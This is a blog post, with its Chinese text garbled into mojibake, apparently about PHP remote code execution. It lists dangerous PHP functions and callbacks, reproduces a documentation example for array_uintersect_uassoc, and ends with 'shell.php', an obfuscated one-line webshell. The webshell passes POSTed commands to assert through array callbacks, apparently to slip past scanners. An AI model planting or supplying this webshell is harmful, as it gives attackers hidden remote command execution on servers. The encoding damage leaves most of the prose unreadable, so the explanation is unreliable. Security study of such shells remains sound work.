---
layout: post
title:  "Զ������ִ��©��"
categories: Remote code execution
tags:  Remote һ�仰ľ��
author: Hannoch
---

* content
{:toc}


Զ������ִ��©�����û�ͨ��������ύִ��������ڷ�������û�����ִ�к�
�������ˣ�������û��ָ������·��������¾�ִ��������ܻ���������ͨ���ı�
$PATH�������������ִ�л���������������ִ��һ�����⹹��Ĵ��롣
��Դ���ٶȰٿ�
# Զ�̴���ִ��ԭ��
	�ͻ�������������Ͷ������󣬸������������з������˿�ִ�еĴ��룬�������˽��������δ
����Դ������������/���ز������Ӷ���ɴ���ִ��©����

# Զ�̴���ִ�г�����

```php
eval()
preg_replace("//e",$_GET['h'],"");
array_map()
usort(),uasort(),uksort()
array_filter()
array_reduce()
array_diff_uassoc(),array_diff_ukey()
array_udiff(),array_udiff_assoc(),
array_udiff_uassoc()
array_intersect_assoc(),array_intersect_uassoc()
array_uintersect(),array_uintersect_assoc(),
array_uintersect_uassoc()
array_walk(),array_walk_recursive()
xml_set_character_data_handler()
xml_set_default_handler()
xml_set_element_handler()
ob_start()
unserialize()
xml_set_end_namespace_decl_handler()
xml_set_external_entity_ref_handler()
xml_set_notation_decl_handler()
xml_set_processing_instruction_handler()
xml_set_start_namespace_decl_handler()
xml_set_unparsed_entity_decl_handler()
stream_filter_register()
set_error_handler()
register_shutdown_function()
register_tick_function()
assert()
```

# ��Ƨ������ɱһ�仰
[PHP array_uintersect_uassoc() ����](http://www.w3school.com.cn/php/func_array_uintersect_uassoc.asp)
�Ƚ���������ļ����ͼ�ֵ��ʹ���û��Զ��庯�����бȽϣ��������ؽ�����ƥ�䣩��

```php
<?php
function myfunction_key($a,$b)
{
if ($a===$b)
  {
  return 0;
  }
  return ($a>$b)?1:-1;
}

function myfunction_value($a,$b)
{
if ($a===$b)
  {
  return 0;
  }
  return ($a>$b)?1:-1;
}

$a1=array("a"=>"red","b"=>"green","c"=>"blue");
$a2=array("a"=>"red","b"=>"green","c"=>"green");

$result=array_uintersect_uassoc($a1,$a2,"myfunction_key","myfunction_value");
print_r($result);
?>
```
�﷨
`array_uintersect_uassoc(array1,array2,array3...,myfunction_key,myfunction_value)`
����	����
**array1** ���衣������������бȽϵĵ�һ�����顣
**array2**	���衣���һ��������бȽϵ����顣
**array3,...**	��ѡ�����һ��������бȽϵ��������顣
** myfunction_key ** ���衣���ڱȽ�����������û��Զ��庯�������ơ�

����ɵ��õıȽϺ����������һ������С�ڵ��ڻ���ڵڶ�����������ȽϺ������뷵��С�ڵ��ڻ���� 0 ��������

** myfunction_value ** ���衣���ڱȽ������ֵ���û��Զ��庯�������ơ�

����ɵ��õıȽϺ����������һ������С�ڵ��ڻ���ڵڶ�����������ȽϺ������뷵��С�ڵ��ڻ���� 0 ��������

ʹ���û��Զ���Ļص����� myfunction_key �� myfunction_value ������������������Ľ��������� array1 �д��ڣ�ͬʱҲ�������κ������д��ڵ���������Ԫ�أ��������ؽ�����顣

ͬʱ���м����ͼ�ֵ�ıȽϣ��� "a"=>1 �� "b"=>1 ������Ԫ���ǲ���ȵġ�

myfunction_key ָ���ĺ������ڱȽϼ����Ƿ���ȡ�myfunction_value ָ���ĺ������ڱȽϼ�ֵ�Ƿ���ȡ��������������������������бȽϵĲ����������һ������С�ڵڶ�����������������һ���������������������ȣ���Ҫ���� 0�������һ���������ڵڶ������򷵻�һ��������

���ص������м������ֲ��䡣

�������ǵ�һ�仰ľ��
shell.php
```php
$a1=array($_POST['cmd']);
$a2=array($_POST['cmd']);
$result=array_uintersect_uassoc($a1,$a2,"assert","assert");
```

�������ڿ����о�����Ҫʹ��Σ�պ���������ı���һ��Ҫ���й��ˡ�
